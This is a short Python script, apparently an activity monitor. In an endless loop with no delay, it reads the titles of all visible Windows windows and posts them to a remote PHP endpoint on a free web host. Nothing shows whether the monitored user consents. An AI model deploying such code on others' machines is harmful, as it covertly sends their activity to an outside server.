import win32gui
import requests
while True :
    l1 = []
    def winEnumHandler( hwnd, ctx ):
        if win32gui.IsWindowVisible( hwnd ):
            l1.append(win32gui.GetWindowText( hwnd ))

    win32gui.EnumWindows( winEnumHandler, None )
    l2 = []
    for x in l1 :
        if not x == "" :
            l2.append(x)
    l1 = []
    for x in l2 :
        if " - " in x :
            m = x.split(" - ")[-1]
            l1.append(m)
        else :
            l1.append(x)
    str1 = ""
    for x in l1 :
        str1 = str1 + "###NEWITEM###" + x
        
    myobj = {'x': str1}

    url = "http://martinserver3.000webhostapp.com/active/active.php"

    requests.post(url, data = myobj).text
